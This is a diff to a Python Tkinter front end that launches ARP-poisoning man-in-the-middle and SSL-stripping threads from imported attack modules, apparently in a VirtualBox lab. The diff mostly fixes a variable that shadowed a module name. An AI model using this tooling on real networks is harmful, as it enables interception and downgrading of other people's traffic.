@@ -1,13 +1,11 @@
 import arp_poison
 import dns_spoof
 import arp_mitm_gateway
-import ssl_strip
 import recon
 import os
 import sys
 import threading
-import atexit
-import signal
+import ssl_strip
 import Tkinter as tk
 
 def main():
@@ -272,19 +270,15 @@ def main():
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT, checked)
 
     def ssl():
-        
-        # Perform Man-in-the-Middle using a separate thread 
         print("MITM Activated")
         gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT))
-
-        # initiate SSL stripping attack on the NAT interface
         print("SSL Stripping...")
-        ssl_strip = threading.Thread(target=ssl_strip.ssl_strip)
+        ssl_attack = threading.Thread(target=ssl_strip.ssl_strip)
 
         gatewayspoof.start()
-        ssl_strip.start()
+        ssl_attack.start()
         gatewayspoof.join()
-        ssl_strip.join()
+        ssl_attack.join()
 
     def exit():
         win.destroy()
